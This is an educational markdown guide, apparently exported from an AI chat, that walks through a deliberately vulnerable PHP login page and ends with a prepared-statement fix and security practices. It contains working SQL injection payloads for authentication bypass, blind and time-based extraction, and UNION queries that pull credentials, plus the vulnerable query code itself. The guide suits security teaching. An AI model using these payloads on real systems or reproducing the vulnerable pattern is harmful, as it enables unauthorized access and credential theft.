# 🔐 Authentication Bypass - SQL Injection Vulnerability Guide

---

## 📋 Table of Contents

1. [Overview](https://claude.ai/chat/a21a5dce-baf8-4982-bfe7-f7e253e56fd4#overview)
2. [Vulnerable Code Analysis](https://claude.ai/chat/a21a5dce-baf8-4982-bfe7-f7e253e56fd4#vulnerable-code-analysis)
3. [Multiple Vulnerabilities Identified](https://claude.ai/chat/a21a5dce-baf8-4982-bfe7-f7e253e56fd4#multiple-vulnerabilities-identified)
4. [Example Attack Payloads](https://claude.ai/chat/a21a5dce-baf8-4982-bfe7-f7e253e56fd4#example-attack-payloads)
5. [Advanced Exploitation Techniques](https://claude.ai/chat/a21a5dce-baf8-4982-bfe7-f7e253e56fd4#advanced-exploitation-techniques)
6. [Secure Code Fix](https://claude.ai/chat/a21a5dce-baf8-4982-bfe7-f7e253e56fd4#secure-code-fix)

---

## 🎯 Overview

This document demonstrates critical SQL injection vulnerabilities in a login authentication system. The vulnerable code allows attackers to bypass authentication and extract sensitive database information.

**⚠️ WARNING:** This information is for educational and security testing purposes only.

---

## 💻 Vulnerable Code Analysis

### **login-1.php**

```php
<?php
    // Include database connection file
    include("connection.php");
?>

<!DOCTYPE html>
<html>
<head>
    <title>User Login</title>
</head>
<body>

    <div style="margin-top:70px; font-size:23px; text-align:center">
        <h1><span class="style4">User Login</span> <br>
        <font size="3" color="#666666">

        <!-- Login form submitting to the same page using PHP_SELF -->
        <!-- VULNERABILITY: PHP_SELF can be exploited for XSS attacks -->
        <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">

            Username: <input type="text" name="username" value="" /> <br />
            Password: <input type="text" name="password" value="" /> <br />
            <input type="submit" name="Login" value="Login" />

        </form>

        <?php

        // Check if both username and password are submitted
        if (isset($_POST['username']) && isset($_POST['password'])) {

            // VULNERABILITY: Direct assignment of POST data without sanitization
            // Attacker can inject SQL code through both username and password fields
            $username=$_POST['username'];
            $password=$_POST['password'];

            // CRITICAL VULNERABILITY: SQL Injection in authentication query
            // Both $username and $password are directly concatenated into the query
            // This allows authentication bypass and blind SQL injection
            //
            // Authentication Bypass Examples:
            // Username: admin' OR '1'='1'-- -
            // Password: anything
            //
            // Boolean-based Blind SQL Injection Examples:
            // Username: admin' AND LENGTH(DATABASE())=9-- -
            // Password: (empty)
            //
            // Time-based Blind SQL Injection Examples:
            // Username: admin' AND SLEEP(10)-- -
            // Password: (empty)
            //
            $query = "SELECT name, password FROM users WHERE name='$username' and password='$password' LIMIT 0,1";

            // Query display commented out (good for production)
            // But underlying vulnerability remains
            //echo $query . '<br>';

            // Execute the vulnerable query
            $result = mysqli_query($connection, $query);

            // ERROR-BASED SQL INJECTION INFORMATION LEAKAGE:
            // If query fails, detailed MySQL error is displayed to user
            // This helps attacker understand database structure and refine attacks
            // Example: Injecting ' reveals column names and table structure
            if (!$result) {
                die("Database Query Failed: " . mysqli_error($connection));
            }

            // BOOLEAN-BASED BLIND SQL INJECTION EXPLOITATION POINT:
            // Different behaviors based on query results:
            // - If query returns rows: displays user data
            // - If query returns no rows: displays "Invalid username or password"
            //
            // Attacker can use this behavioral difference to extract data:
            // Username: admin' AND ASCII(SUBSTR(DATABASE(),1,1))=97-- -
            // - If TRUE: displays user data
            // - If FALSE: displays error message
            if (mysqli_num_rows($result) > 0) {
                while ($row = mysqli_fetch_assoc($result)) {
                    echo "<font color=\"#000000\">";
                    // INFORMATION DISCLOSURE: Displays password in plain text
                    // Passwords should NEVER be displayed, even to authenticated users
                    echo 'Your Name:'. ' . ' . $row['name'];
                    echo "<br>";
                    echo 'Your Password:' . ' . ' . $row['password'];
                    echo "</font>";
                }
            } else {
                // Error message for failed login
                // This message difference enables boolean-based blind SQL injection
                echo '<font color="#ff0000">Invalid username or password</font>';
            }

        } else {
            // Initial page load message
            echo '<font color="#ff0000">Please enter username and password</font>';
        }

        ?>

    </font> </h1>
</div>

<br></br><br>

</body>
</html>
```

---

## 🚨 Multiple Vulnerabilities Identified

### **1. SQL Injection (Authentication Bypass)**

**Payload Examples:**

```sql
Username: admin' OR '1'='1'-- -
Password: (anything)

Resulting query: SELECT name, password FROM users WHERE name='admin' OR '1'='1'-- -' and password='...'
The OR '1'='1' makes the condition always true, bypassing authentication
```

---

### **2. Boolean-Based Blind SQL Injection**

**Payload Examples:**

```sql
Username: admin' AND LENGTH(DATABASE())=9-- -
Password: (empty)

- If TRUE: User data displayed
- If FALSE: "Invalid username or password" displayed
```

---

### **3. Time-Based Blind SQL Injection**

**Payload Examples:**

```sql
Username: admin' AND SLEEP(10)-- -
Password: (empty)

- Response delayed by 10 seconds if injection successful
- Attacker can extract data by timing responses
```

---

### **4. Error-Based SQL Injection**

**Payload Examples:**

```sql
Username: admin'
Password: (empty)

MySQL error message reveals database structure information
```

---

### **5. Information Disclosure**

- **Passwords displayed in plain text after login**
- Should be hashed and never displayed

---

### **6. XSS Vulnerability (PHP_SELF)**

- `$_SERVER['PHP_SELF']` can be exploited for reflected XSS
- Should use a fixed action URL or sanitize PHP_SELF

---

## 💣 Example Attack Payloads

### **Authentication Bypass**

```sql
1. Username: admin' OR '1'='1'-- -
2. Username: admin' OR 1=1#
3. Username: ' OR '1'='1
4. Username: admin'-- -
```

---

### **Extract Database Name Length**

```sql
1. Username: admin' AND LENGTH(DATABASE())=1-- -
2. Username: admin' AND LENGTH(DATABASE())=2-- -
3. ...continue until TRUE response
```

---

### **Extract Database Name Character-by-Character**

```sql
1. Username: admin' AND ASCII(SUBSTR(DATABASE(),1,1))=97-- -
2. Username: admin' AND ASCII(SUBSTR(DATABASE(),1,1))=98-- -
3. ...test each ASCII value until TRUE response
```

---

### **Time-Based Extraction**

```sql
1. Username: admin' AND IF(LENGTH(DATABASE())=0, SLEEP(5), 0)-- -
2. Username: admin' AND IF(ASCII(SUBSTR(DATABASE(),1,1))=97, SLEEP(5), 0)-- -
```

---

### **Extract Table Names**

```sql
Username: admin' UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=DATABASE()-- -
```

---

## 🛠️ Advanced Exploitation Techniques

### **Basic Comment Injection**

```sql
--
```

- Ends the query and comments out the rest of the SQL statement.

---

### **Order By Enumeration**

```sql
' order by 2 --
```

- Attempts to order the result set by the second column.
- Can reveal number of columns or cause errors revealing database structure.

---

### **UNION-Based Injection to Extract Data**

```sql
' union all select current_user(), 2 --
```

- Uses `UNION` to append the current database user to the result set.

```sql
' union all select 1, database() --
```

- Selects a dummy value and the current database name.

```sql
' union all select email, password from users limit 0,1 --
```

- Attempts to extract email and password from `users` table, limited to first record.
- **Very dangerous as it exposes sensitive user credentials.**

---

### **How These Work in Practice**

The vulnerable query structure allows attackers to:

1. **Bypass Authentication**: Using `OR '1'='1'` makes the WHERE clause always true
2. **Extract Data Blindly**: By observing different responses (success/error messages)
3. **Extract Data via UNION**: By appending additional SELECT statements
4. **Map Database Structure**: Using information_schema tables
5. **Exfiltrate Sensitive Data**: Including usernames, passwords, emails

---

## ✅ Secure Code Fix

### **Secure Implementation**

```php
<?php
    include("connection.php");

    if (isset($_POST['username']) && isset($_POST['password'])) {
        $username = $_POST['username'];
        $password = $_POST['password'];

        // Use prepared statements to prevent SQL injection
        $stmt = mysqli_prepare($connection, "SELECT name, password FROM users WHERE name=? LIMIT 1");
        mysqli_stmt_bind_param($stmt, "s", $username);
        mysqli_stmt_execute($stmt);
        $result = mysqli_stmt_get_result($stmt);

        if ($row = mysqli_fetch_assoc($result)) {
            // Verify password using password_verify() for hashed passwords
            if (password_verify($password, $row['password'])) {
                echo "Login successful!";
                // Set session variables, redirect, etc.
            } else {
                echo "Invalid credentials";
            }
        } else {
            echo "Invalid credentials";
        }

        mysqli_stmt_close($stmt);
    }
?>
```

---

## 🔒 Security Best Practices

### **1. Input Validation**

- ✅ Use prepared statements/parameterized queries
- ✅ Validate and sanitize all user inputs
- ✅ Use whitelisting for expected input patterns

### **2. Password Security**

- ✅ Hash passwords using `password_hash()`
- ✅ Verify passwords using `password_verify()`
- ✅ Never display passwords in any form

### **3. Error Handling**

- ✅ Use generic error messages
- ✅ Log detailed errors server-side only
- ✅ Never expose database structure to users

### **4. Additional Security Measures**

- ✅ Use HTTPS for all login pages
- ✅ Implement rate limiting
- ✅ Add CAPTCHA for repeated failed attempts
- ✅ Use Web Application Firewall (WAF)
- ✅ Regular security audits and penetration testing

---

## 📚 Additional Resources

- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [OWASP Top 10 - Injection](https://owasp.org/www-project-top-ten/)
- [PHP Prepared Statements](https://www.php.net/manual/en/mysqli.quickstart.prepared-statements.php)

---

**⚠️ DISCLAIMER:** This documentation is created for educational purposes to help developers understand and prevent SQL injection vulnerabilities. Never use this information to attack systems you don't own or have permission to test.

---

_Last Updated: February 10, 2026_